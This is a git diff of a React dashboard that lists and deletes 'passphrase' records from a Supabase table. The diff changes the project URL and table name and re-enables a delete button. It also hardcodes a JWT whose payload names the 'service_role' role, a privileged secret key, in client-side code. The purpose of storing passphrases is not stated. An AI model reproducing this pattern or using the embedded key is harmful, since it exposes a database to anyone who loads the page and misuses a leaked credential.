@@ -1,9 +1,9 @@
 import { useEffect, useState } from "react";
 import { createClient } from "@supabase/supabase-js";
 
-const supabaseUrl = "https://pqalanvbnnbdcqtlztmg.supabase.co";
+const supabaseUrl = "https://oxsnztxcaehckiadajbw.supabase.co";
 const supabaseKey =
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBxYWxhbnZibm5iZGNxdGx6dG1nIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTczMTA3OTksImV4cCI6MjA3Mjg4Njc5OX0.4Yq1o0dN08qDB1xR9hLRzQDEV7lREUqP4YZDLUo1bhg";
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im94c256dHhjYWVoY2tpYWRhamJ3Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjY4NjYyMSwiZXhwIjoyMDkyMjYyNjIxfQ.kZT5BjHeNH0UxKuGYKWMjhmBzf_LU3Br9s6T6dCjsX4";
 
 const supabase = createClient(supabaseUrl, supabaseKey);
 
@@ -15,7 +15,7 @@ function Dashboard() {
   useEffect(() => {
     const fetchData = async () => {
       const { data, error } = await supabase
-        .from("friend")
+        .from("fire")
         .select("id, passphrase, created_at")
         .order("created_at", { ascending: false });
 
@@ -29,7 +29,7 @@ function Dashboard() {
   }, []);
 
   const handleDelete = async (id) => {
-    await supabase.from("friend").delete().eq("id", id);
+    await supabase.from("fire").delete().eq("id", id);
     setPhrases(phrases.filter((p) => p.id !== id));
   };
 
@@ -73,14 +73,14 @@ function Dashboard() {
                 <td className="p-3">
                   {new Date(p.created_at).toLocaleString()}
                 </td>
-                {/* <td className="p-3">
+                <td className="p-3">
                   <button
                     onClick={() => handleDelete(p.id)}
                     className="px-3 py-1 bg-red-600 text-white rounded"
                   >
                     Delete
                   </button>
-                </td> */}
+                </td>
               </tr>
             ))}
             {filteredPhrases.length === 0 && (
